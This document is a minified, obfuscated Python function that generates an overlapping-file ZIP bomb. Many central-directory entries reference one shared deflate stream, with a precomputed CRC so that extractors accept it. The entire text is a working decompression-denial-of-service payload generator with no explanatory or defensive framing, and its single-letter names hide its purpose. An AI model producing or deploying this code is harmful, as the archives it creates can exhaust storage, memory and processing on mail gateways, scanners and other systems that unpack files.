# warning: minified
from functools import reduce as C
A=lambda i:bytes.fromhex('%.8x'%i)[::-1]
I=lambda m,v:C(lambda i,j:i^j,[B*(v>>A&1)for(A,B)in enumerate(m)])
B=lambda i:b'\0'*i
def make_zip(f,num_files,compressed_size):
	M,J,C,D,N,E=(1<<32)-1,num_files,compressed_size,[1<<A for A in range(33)],range(8),[0]*8
	for F in N:
		for S in N:E[F]=E[F]>>1^3988292384*((1<<F>>S^E[F])&1)
	G,H=C*1032-14447,E+D[:24]+[0];O=G
	while G:
		if G&1:D=[I(D,A)for A in H]
		H=[I(H,A)for A in H];G>>=1
	P=~I(D,M)&M;K=f.write(b'PK\3\4\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+b'\1\0\0\0\0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+B(C-15)+b'`');Q=K
	for T in range(J):R=str(T).encode();K+=f.write(b'PK\1\2\x14\0\x14\0\0\0\x08'+B(5)+A(P)+A(C)+A(O)+A(len(R))[:2]+B(16)+R)
	f.write(b'PK\5\6'+B(4)+A(J+(J<<16))+A(K-Q)+A(Q)+B(2))
